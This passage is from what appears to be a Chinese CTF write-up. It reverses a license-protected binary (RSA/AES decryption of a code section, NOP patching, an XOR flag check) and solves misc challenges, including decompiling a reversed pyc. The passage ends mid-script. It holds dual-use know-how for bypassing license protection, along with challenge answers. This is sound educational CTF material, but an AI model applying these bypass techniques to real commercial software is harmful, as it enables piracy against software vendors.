<p>对应的函数从控制台读入了license，并调用了<code>sub_16a0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line">void __fastcall sub_16A0(const char *a1)</div><div class="line">&#123;</div><div class="line">  const char *v1; // rbx</div><div class="line">  int v2; // eax</div><div class="line">  __int64 v3; // rdi</div><div class="line">  unsigned int v4; // ebp</div><div class="line">  _BYTE *v5; // r13</div><div class="line">  __int64 v6; // rax</div><div class="line">  __int64 v7; // r12</div><div class="line">  __int64 v8; // rax</div><div class="line">  __int64 v9; // rbx</div><div class="line">  __int64 v10; // rax</div><div class="line">  unsigned int v11; // er12</div><div class="line">  __int64 v12; // rbx</div><div class="line">  __int64 v13; // rbp</div><div class="line">  int v14; // eax</div><div class="line">  __m128i *v15; // rbx</div><div class="line">  __int64 v16; // rax</div><div class="line">  int v17; // eax</div><div class="line">  size_t v18; // rbp</div><div class="line">  __int64 v19; // rsi</div><div class="line">  char *v20; // rdi</div><div class="line">  __int64 v21; // r14</div><div class="line">  __int64 v22; // rax</div><div class="line">  char *v23; // r13</div><div class="line">  int v24; // er12</div><div class="line">  unsigned __int64 v25; // rdi</div><div class="line">  __int64 *v26; // rbx</div><div class="line">  __int64 v27; // rax</div><div class="line">  int v28; // [rsp+Ch] [rbp-8Ch]</div><div class="line">  __m128i v29; // [rsp+10h] [rbp-88h]</div><div class="line">  __m128i v30; // [rsp+20h] [rbp-78h]</div><div class="line">  __m128i v31; // [rsp+30h] [rbp-68h]</div><div class="line">  __m128i v32; // [rsp+40h] [rbp-58h]</div><div class="line">  __int64 v33; // [rsp+50h] [rbp-48h]</div><div class="line">  unsigned __int64 v34; // [rsp+58h] [rbp-40h]</div><div class="line"></div><div class="line">  v1 = a1;</div><div class="line">  v34 = __readfsqword(0x28u);</div><div class="line">  v2 = strlen(a1);</div><div class="line">  v3 = v2;</div><div class="line">  v4 = v2;</div><div class="line">  v5 = malloc(v2);</div><div class="line">  v6 = BIO_f_base64(v3);</div><div class="line">  v7 = BIO_new(v6);</div><div class="line">  v8 = BIO_new_mem_buf(v1, v4);</div><div class="line">  v9 = BIO_push(v7, v8);</div><div class="line">  BIO_ctrl(v9, 11LL, 0LL, 0LL);</div><div class="line">  v10 = (signed int)BIO_read(v9, v5, v4);</div><div class="line">  v5[v10] = 0;</div><div class="line">  v11 = v10;</div><div class="line">  BIO_free_all(v9);</div><div class="line">  __printf_chk(1LL, &quot;b64decode size: %d\n&quot;, v11);</div><div class="line">  v12 = BIO_new_mem_buf(&amp;unk_2031AC, &amp;unk_20336F - &amp;unk_2031AC);</div><div class="line">  v13 = PEM_read_bio_RSA_PUBKEY(v12, 0LL, 0LL, 0LL);</div><div class="line">  BIO_free(v12);</div><div class="line">  if ( v13 )</div><div class="line">  &#123;</div><div class="line">    v14 = RSA_size(v13);</div><div class="line">    v15 = (__m128i *)malloc(v14);</div><div class="line">    RSA_public_decrypt(v11, v5, v15, v13, 1LL);</div><div class="line">    RSA_free(v13);</div><div class="line">    v16 = v15[4].m128i_i64[0];</div><div class="line">    v29 = _mm_loadu_si128(v15);</div><div class="line">    v33 = v16;</div><div class="line">    v30 = _mm_loadu_si128(v15 + 1);</div><div class="line">    v31 = _mm_loadu_si128(v15 + 2);</div><div class="line">    v32 = _mm_loadu_si128(v15 + 3);</div><div class="line">    free(v15);</div><div class="line">  &#125;</div><div class="line">  v17 = getpagesize();</div><div class="line">  v18 = v17;</div><div class="line">  v19 = v17;</div><div class="line">  v20 = (char *)sub_19C0 - (unsigned __int64)sub_19C0 % v17;</div><div class="line">  mprotect(v20, v17, 7);</div><div class="line">  v21 = EVP_CIPHER_CTX_new(v20, v19);</div><div class="line">  v22 = EVP_aes_256_cbc();</div><div class="line">  EVP_DecryptInit(v21, v22, &amp;v29, &amp;v31);</div><div class="line">  EVP_CIPHER_CTX_set_padding(v21, 0LL);</div><div class="line">  v23 = (char *)malloc((char *)term_proc - (char *)sub_19C0 + 16);</div><div class="line">  EVP_DecryptUpdate(v21, v23, &amp;v28, sub_19C0, (unsigned int)((char *)term_proc - (char *)sub_19C0));</div><div class="line">  v24 = v28;</div><div class="line">  EVP_DecryptFinal(v21, &amp;v23[v28], &amp;v28);</div><div class="line">  memcpy(sub_19C0, v23, v24 + v28);</div><div class="line">  free(v23);</div><div class="line">  v25 = qword_2033A0;</div><div class="line">  if ( qword_2033A0 )</div><div class="line">  &#123;</div><div class="line">    v26 = &amp;qword_2033A0;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      while ( !(v26[1] &amp; v33) )</div><div class="line">      &#123;</div><div class="line">        v26 += 2;</div><div class="line">        v25 = *v26;</div><div class="line">        if ( !*v26 )</div><div class="line">          return;</div><div class="line">      &#125;</div><div class="line">      v26 += 2;</div><div class="line">      mprotect((void *)(v25 - v25 % v18), v18, 7);</div><div class="line">      v27 = *(v26 - 2);</div><div class="line">      *(_DWORD *)v27 = 0x90909090;</div><div class="line">      *(_BYTE *)(v27 + 4) = 0x90u;</div><div class="line">      v25 = *v26;</div><div class="line">    &#125;</div><div class="line">    while ( *v26 );</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>sub_16a0</code> 完成了base64解码，rsa解密，aes_cbc解密，并在解密后将一段内存替换为了<code>90 90 90 90 90</code>。如果敏感的话，这里明显是在替换成<code>nop ...</code>指令。不过没发现也没事，我们可以后面动态调试。<br>明显，<code>EVP_DecryptInit(v21, v22, &amp;v29, &amp;v31);</code> 对应KEY和IV的参数，都是由RSA解密后的数据<code>v15</code>来的，因此要重点关心一下AES到底解密了啥。<br><code>EVP_DecryptUpdate(v21, v23, &amp;v28, sub_19C0, (unsigned int)((char *)term_proc - (char *)sub_19C0));</code> 这里传入的地址是<code>sub_19c0</code>，size是<code>term_proc - sub_19c0</code>,跳转到<code>sub_19c0</code>看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">protected:00000000000019C0 sub_19C0        proc far                ; CODE XREF: .text:00000000000011C5↑j</div><div class="line">protected:00000000000019C0                                         ; DATA XREF: sub_16A0:loc_17E4↑o</div><div class="line">protected:00000000000019C0 ; __unwind &#123;</div><div class="line">protected:00000000000019C0                 mov     cl, 57h ; &apos;W&apos;</div><div class="line">protected:00000000000019C2                 movsd</div><div class="line">protected:00000000000019C3                 retf</div><div class="line">protected:00000000000019C3 sub_19C0        endp</div><div class="line">protected:00000000000019C3</div><div class="line">protected:00000000000019C3 ; ---------------------------------------------------------------------------</div><div class="line">protected:00000000000019C4                 dd 0AAE07FBCh</div><div class="line">protected:00000000000019C8                 dq 7377960DB082A6D4h, 20A9907265E37A56h, 0C0EE3002F6A022F1h</div><div class="line">protected:00000000000019C8                 dq 0DA34CA6597E060D2h, 0AD3F087F2F712AC0h, 2D449E3657B67092h</div><div class="line">protected:00000000000019C8                 dq 7EFBF76461C835AEh, 0CA3A2F1F6BD9C3A3h, 44B78C39C5EE967Ah</div><div class="line">protected:00000000000019C8                 dq 0BA132C2118113477h, 0D6DCF6649B92C65Dh, 7EA2578B98A01ED3h</div><div class="line">protected:00000000000019C8                 dq 3B48240BB1C350CFh, 0D0CDD055EE84C8F7h, 54F5B8F0F927AAAAh</div><div class="line">protected:00000000000019C8                 dq 0D5EF5F140160B5E1h, 17B1445512CA5AB0h, 9193B2F97B725AC1h</div><div class="line">protected:00000000000019C8                 dq 0A28AF713CBDAFE8Eh, 452618AF1E34DB28h, 2C94F9D13D155D4Ah</div><div class="line">protected:00000000000019C8                 dq 3CD909CDB9D105F9h, 53EE901A203FBEBAh, 84D147C50674ECA7h</div><div class="line">protected:00000000000019C8                 dq 6815A1F60179F284h, 0D40D3484C66C7EAFh, 47B12282C741B298h</div><div class="line">protected:00000000000019C8                 dq 1059744C56A877AEh, 0FAE0DECEEFA7103Eh, 85F0F585625C21AEh</div><div class="line">protected:00000000000019C8                 dq 2D22E7585454836Ah, 21BB08002B85E034h, 0ACE68E35258784ADh</div><div class="line">protected:00000000000019C8                 dq 0CA93D3F3A06681A9h, 390139D8389DAE1Bh, 7F6DB02B671BDCA6h</div><div class="line">protected:00000000000019C8                 dq 3FFD7505BF5864CBh, 0D6B332ADAF3D2C2Dh, 33747267742F7E1Bh</div><div class="line">protected:00000000000019C8                 dq 5CEE44A063A998B0h, 1BF088761D678E3Bh, 568B6B1E008B5677h</div><div class="line">protected:00000000000019C8                 dq 347C9E9758B15A65h, 0D835A24E41DA0EB7h, 0AA9D8572FF22DE1Ah</div><div class="line">protected:00000000000019C8                 dq 59F18E6141D961Dh, 4F1BD2919272156h, 0D9C5BE02E9E0499Dh</div><div class="line">protected:00000000000019C8                 dq 0C70AF6C49C77BBB7h, 3363804DF15B98B1h, 90B880C5D3C90256h</div><div class="line">protected:00000000000019C8                 dq 21EC795F29E0F199h, 51AEF1B5DD2BCF23h, 8F730FCA2104083Eh</div><div class="line">protected:00000000000019C8                 dq 59EA15EF9297BFACh, 3C27A1FDE8C44BBEh, 0C957D242993A0F03h</div><div class="line">protected:00000000000019C8                 dq 7280FE25FA7A99A6h, 4F05DE22E472D254h</div><div class="line">protected:00000000000019C8 ; &#125; // starts at 1A80</div><div class="line">protected:00000000000019C8 protected       ends</div><div class="line">protected:00000000000019C8</div><div class="line">.fini:0000000000001BA0 ; ===========================================================================</div><div class="line">.fini:0000000000001BA0</div><div class="line">.fini:0000000000001BA0 ; Segment type: Pure code</div><div class="line">.fini:0000000000001BA0 ; Segment permissions: Read/Execute</div><div class="line">.fini:0000000000001BA0 _fini           segment dword public &apos;CODE&apos; use64</div><div class="line">.fini:0000000000001BA0                 assume cs:_fini</div><div class="line">.fini:0000000000001BA0                 ;org 1BA0h</div><div class="line">.fini:0000000000001BA0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</div><div class="line">.fini:0000000000001BA0</div><div class="line">.fini:0000000000001BA0 ; =============== S U B R O U T I N E =======================================</div><div class="line">.fini:0000000000001BA0</div><div class="line">.fini:0000000000001BA0</div><div class="line">.fini:0000000000001BA0                 public _term_proc</div><div class="line">.fini:0000000000001BA0 _term_proc      proc near               ; DATA XREF: sub_16A0+14B↑o</div><div class="line">.fini:0000000000001BA0                 sub     rsp, 8</div><div class="line">.fini:0000000000001BA4                 add     rsp, 8</div><div class="line">.fini:0000000000001BA8                 retn</div><div class="line">.fini:0000000000001BA8 _term_proc      endp</div><div class="line">.fini:0000000000001BA8</div><div class="line">.fini:0000000000001BA8 _fini           ends</div><div class="line">.fini:0000000000001BA8</div></pre></td></tr></table></figure></p>
<p>明显看出，<code>19c0</code>处的汇编代码是错误的，后面也全都是乱码，解密的区域也是这堆数据，而且这个section名字也不是<code>.text</code>。</p>
<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>此时我们就要gdb挂上看一看解密完了到底是啥了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0x5555555559c0:      push   %rbx</div><div class="line">   0x5555555559c1:      lea    0x275(%rip),%rsi        # 0x555555555c3d</div><div class="line">   0x5555555559c8:      mov    $0x1,%edi</div><div class="line">   0x5555555559cd:      sub    $0x90,%rsp</div><div class="line">   0x5555555559d4:      mov    %fs:0x28,%rax</div><div class="line">   0x5555555559dd:      mov    %rax,0x88(%rsp)</div><div class="line">   0x5555555559e5:      xor    %eax,%eax</div><div class="line">   0x5555555559e7:      mov    %rsp,%rbx</div><div class="line">   0x5555555559ea:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x5555555559ef:      lea    0x256(%rip),%rdi        # 0x555555555c4c</div><div class="line">   0x5555555559f6:      mov    %rbx,%rsi</div><div class="line">   0x5555555559f9:      xor    %eax,%eax</div><div class="line">   0x5555555559fb:      callq  0x555555554f20 &lt;__isoc99_scanf@plt&gt;</div><div class="line">   0x555555555a00:      lea    0x24b(%rip),%rsi        # 0x555555555c52</div><div class="line">   0x555555555a07:      mov    %rbx,%rdx</div><div class="line">   0x555555555a0a:      mov    $0x1,%edi</div><div class="line">   0x555555555a0f:      xor    %eax,%eax</div><div class="line">   0x555555555a11:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x555555555a16:      lea    0x23d(%rip),%rdi        # 0x555555555c5a</div><div class="line">   0x555555555a1d:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555a22:      lea    0x23a(%rip),%rdi        # 0x555555555c63</div><div class="line">   0x555555555a29:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555a2e:      lea    0x23f(%rip),%rdi        # 0x555555555c74</div><div class="line">   0x555555555a35:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555a3a:      lea    0x248(%rip),%rdi        # 0x555555555c89</div><div class="line">   0x555555555a41:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555a46:      lea    0x24e(%rip),%rdi        # 0x555555555c9b</div><div class="line">   0x555555555a4d:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555a52:      mov    0x88(%rsp),%rcx</div><div class="line">   0x555555555a5a:      xor    %fs:0x28,%rcx</div><div class="line">   0x555555555a63:      jne    0x555555555a70</div><div class="line">   0x555555555a65:      add    $0x90,%rsp</div><div class="line">   0x555555555a6c:      xor    %eax,%eax</div><div class="line">   0x555555555a6e:      pop    %rbx</div><div class="line">   0x555555555a6f:      retq</div></pre></td></tr></table></figure>
<p><strong>!惊了</strong>，这里竟然变成代码了！ 我们可以直接把这整个section直接反编译出来! 合理的猜测下，<code>2, 3</code>两个菜单选项应该调用的都是这里的代码。于是我们调试回<code>2. cow say</code>看看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) x/10i $rip</div><div class="line">=&gt; 0x5555555551c0:      nop</div><div class="line">   0x5555555551c1:      nop</div><div class="line">   0x5555555551c2:      nop</div><div class="line">   0x5555555551c3:      nop</div><div class="line">   0x5555555551c4:      nop</div><div class="line">   0x5555555551c5:      jmpq   0x5555555559c0</div><div class="line">   0x5555555551ca:      jmpq   0x555555555930</div><div class="line">   0x5555555551cf:      jmpq   0x555555555a80</div></pre></td></tr></table></figure></p>
<p><strong>!惊了</strong> 这里的代码变成了nop? 抓紧回IDA看看原来是啥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">.text:00000000000011C0 sub_11C0        proc near               ; CODE XREF: main+CA↑p</div><div class="line">.text:00000000000011C0                                         ; .text:000000000000137A↓j</div><div class="line">.text:00000000000011C0                                         ; DATA XREF: ...</div><div class="line">.text:00000000000011C0                 jmp     sub_1930</div><div class="line">.text:00000000000011C0 sub_11C0        endp</div><div class="line">.text:00000000000011C0</div><div class="line">.text:00000000000011C5 ; ---------------------------------------------------------------------------</div><div class="line">.text:00000000000011C5                 jmp     near ptr sub_19C0</div><div class="line">.text:00000000000011CA</div><div class="line">.text:00000000000011CA ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:00000000000011CA</div><div class="line">.text:00000000000011CA ; Attributes: thunk</div><div class="line">.text:00000000000011CA</div><div class="line">.text:00000000000011CA sub_11CA        proc near               ; CODE XREF: main+DA↑p</div><div class="line">.text:00000000000011CA                                         ; .text:0000000000001352↓j</div><div class="line">.text:00000000000011CA                                         ; DATA XREF: ...</div><div class="line">.text:00000000000011CA                 jmp     sub_1930</div><div class="line">.text:00000000000011CA sub_11CA        endp</div><div class="line">.text:00000000000011CA</div><div class="line">.text:00000000000011CA ; ---------------------------------------------------------------------------</div><div class="line">.text:00000000000011CF                 db 0E9h</div><div class="line">.text:00000000000011D0 ; ---------------------------------------------------------------------------</div></pre></td></tr></table></figure></p>
<p><code>jmp sub_1930</code> 被patch成了nop！<br>我们再看看 <code>3. check_flag</code>是调用的啥？ <code>sub_11CA</code>！ 再看看<code>sub_1930</code>做了啥？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int sub_1930()</div><div class="line">&#123;</div><div class="line">  return puts(&quot;You have no license to run this feature.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>原来注册成功后，对应跳转到unlicensed的jmp就会patch成nop， 那后面跟的就是jmp 到实际的函数。</p>
<p>从IDA里U+C一下，将sub_11ca恢复完整<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.text:00000000000011CA sub_11CA        proc near               ; CODE XREF: main+DA↑p</div><div class="line">.text:00000000000011CA                                         ; .text:0000000000001352↓j</div><div class="line">.text:00000000000011CA                                         ; DATA XREF: ...</div><div class="line">.text:00000000000011CA                 jmp     sub_1930</div><div class="line">.text:00000000000011CA sub_11CA        endp</div><div class="line">.text:00000000000011CA</div><div class="line">.text:00000000000011CF ; ---------------------------------------------------------------------------</div><div class="line">.text:00000000000011CF                 jmp     near ptr qword_19C8+0B8h</div></pre></td></tr></table></figure></p>
<p>check_flag真实的位置应该就是<code>qword_19C8+0B8h</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">(gdb) x/100i 0x555555554000+0x19c8+0xb8</div><div class="line">=&gt; 0x555555555a80:      push   %rbx</div><div class="line">   0x555555555a81:      lea    0x1dd(%rip),%rsi        # 0x555555555c65</div><div class="line">   0x555555555a88:      mov    $0x1,%edi</div><div class="line">   0x555555555a8d:      sub    $0x110,%rsp</div><div class="line">   0x555555555a94:      mov    %fs:0x28,%rax</div><div class="line">   0x555555555a9d:      mov    %rax,0x108(%rsp)</div><div class="line">   0x555555555aa5:      xor    %eax,%eax</div><div class="line">   0x555555555aa7:      lea    0x80(%rsp),%rbx</div><div class="line">   0x555555555aaf:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x555555555ab4:      lea    0x1b9(%rip),%rdi        # 0x555555555c74</div><div class="line">   0x555555555abb:      mov    %rbx,%rsi</div><div class="line">   0x555555555abe:      xor    %eax,%eax</div><div class="line">   0x555555555ac0:      callq  0x555555554f20 &lt;__isoc99_scanf@plt&gt;</div><div class="line">   0x555555555ac5:      movdqa 0x213(%rip),%xmm0        # 0x555555555ce0</div><div class="line">   0x555555555acd:      xor    %eax,%eax</div><div class="line">   0x555555555acf:      movb   $0xf4,0x20(%rsp)</div><div class="line">   0x555555555ad4:      movb   $0x0,0x21(%rsp)</div><div class="line">   0x555555555ad9:      mov    $0x1,%esi</div><div class="line">   0x555555555ade:      movaps %xmm0,(%rsp)</div><div class="line">   0x555555555ae2:      mov    %rsp,%rdx</div><div class="line">   0x555555555ae5:      xor    %r8d,%r8d</div><div class="line">   0x555555555ae8:      movdqa 0x200(%rip),%xmm0        # 0x555555555cf0</div><div class="line">   0x555555555af0:      movaps %xmm0,0x10(%rsp)</div><div class="line">   0x555555555af5:      nopl   (%rax)</div><div class="line">   0x555555555af8:      movzbl (%rbx,%rax,1),%ecx</div><div class="line">   0x555555555afc:      mov    %ecx,%edi</div><div class="line">   0x555555555afe:      xor    $0xffffff89,%edi</div><div class="line">   0x555555555b01:      cmp    %dil,(%rdx,%rax,1)</div><div class="line">   0x555555555b05:      mov    %cl,(%rdx,%rax,1)</div><div class="line">   0x555555555b08:      cmovne %r8d,%esi</div><div class="line">   0x555555555b0c:      add    $0x1,%rax</div><div class="line">   0x555555555b10:      cmp    $0x21,%rax</div><div class="line">   0x555555555b14:      jne    0x555555555af8</div><div class="line">   0x555555555b16:      test   %esi,%esi</div><div class="line">   0x555555555b18:      jne    0x555555555b2e</div><div class="line">   0x555555555b1a:      movabs $0x6c6620676e6f7277,%rax</div><div class="line">   0x555555555b24:      movl   $0x216761,0x8(%rdx)</div><div class="line">   0x555555555b2b:      mov    %rax,(%rdx)</div><div class="line">   0x555555555b2e:      lea    0x145(%rip),%rsi        # 0x555555555c7a</div><div class="line">   0x555555555b35:      mov    $0x1,%edi</div><div class="line">   0x555555555b3a:      xor    %eax,%eax</div><div class="line">   0x555555555b3c:      callq  0x555555554dc0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x555555555b41:      lea    0x13a(%rip),%rdi        # 0x555555555c82</div><div class="line">   0x555555555b48:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555b4d:      lea    0x137(%rip),%rdi        # 0x555555555c8b</div><div class="line">   0x555555555b54:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555b59:      lea    0x13c(%rip),%rdi        # 0x555555555c9c</div><div class="line">   0x555555555b60:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555b65:      lea    0x145(%rip),%rdi        # 0x555555555cb1</div><div class="line">   0x555555555b6c:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555b71:      lea    0x14b(%rip),%rdi        # 0x555555555cc3</div><div class="line">   0x555555555b78:      callq  0x555555554db0 &lt;puts@plt&gt;</div><div class="line">   0x555555555b7d:      xor    %eax,%eax</div><div class="line">   0x555555555b7f:      mov    0x108(%rsp),%rbx</div><div class="line">   0x555555555b87:      xor    %fs:0x28,%rbx</div><div class="line">   0x555555555b90:      jne    0x555555555b9b</div><div class="line">   0x555555555b92:      add    $0x110,%rsp</div><div class="line">   0x555555555b99:      pop    %rbx</div><div class="line">   0x555555555b9a:      retq</div><div class="line">   0x555555555b9b:      callq  0x555555554ef0 &lt;__stack_chk_fail@plt&gt;</div><div class="line">   0x555555555ba0:      sub    $0x8,%rsp</div><div class="line">   0x555555555ba4:      add    $0x8,%rsp</div><div class="line">   0x555555555ba8:      retq</div></pre></td></tr></table></figure></p>
<p>实际这一段应该是一个很简单的异或<code>0x89</code>逻辑，能做到这里基本就已经解决的差不多了。<br>然后出题人做着做着发现。比赛当天的binary似乎传错了…<br>正确的binary:<br><a href="https://dl.summershrimp.com/BuggyProtect-new" target="_blank" rel="external">https://dl.summershrimp.com/BuggyProtect-new</a></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>打开即送flag</p>
<h3 id="fs"><a href="#fs" class="headerlink" title="fs"></a>fs</h3><p>apfs</p>
<p>dmg末尾给了12位的密码<code>Xmas3?theme3</code></p>
<p>直接打开dmg得到flag.txt</p>
<h3 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h3><p>pyc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'rev'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f1:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'genflag'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f2:</div><div class="line">        f2.write(f1.read()[::<span class="number">-1</span>])</div></pre></td></tr></table></figure>
<p>得到genflag后，modu1e需要改为module</p>
<p>用uncompyle6</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uncompyle6 -o . genflag</div></pre></td></tr></table></figure>
<p>参考enc写dec</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">()</span>:</span></div><div class="line">    flag = <span class="string">r'To make it more difficult to calculate the flag by hand, nuaactf&#123;py_uncompyle&#125;, flag is for scripts'</span></div><div class="line">    [print(<span class="string">'&#123;:x&#125;'</span>.format(ord(each)+<span class="number">0x32</span>), end=<span class="string">'l'</span>) <span class="keyword">for</span> each <span class="keyword">in</span> flag]</div><div class="line">    print()</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">()</span>:</span></div><div class="line">    enc_flag = <span 